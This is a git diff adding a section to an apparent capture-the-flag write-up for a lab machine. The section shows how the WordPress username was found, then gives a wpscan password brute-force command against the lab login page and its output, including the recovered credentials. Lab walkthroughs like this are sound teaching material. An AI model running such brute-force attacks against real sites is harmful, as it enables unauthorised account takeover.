@@ -73,6 +73,27 @@ Used Dirbuster to bruteforce the webserver directory
 <details> 
 <summary> username and password </summary>
 
+Username: Elliot
+###
+from trial and error devised, admin was given no known user and Elliot was given wrong password
+
+Password: 
+###
+- downloaded the fsocity.dic from browser using wget
+- sorted out all of the duplicates
+- ran the sorted list through wpscan
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# wpscan --url http://10.10.10.103/wp-login.php -U "Elliot" --passwords /home/kali/sorted.dic
+
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - Elliot / ER28-0652                                                                                                                
+Trying Elliot / ER28-0652 Time: 00:01:36 <===================                                           > (5630 / 17081) 32.96%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: Elliot, Password: ER28-0652
+```
 
 
 </details>
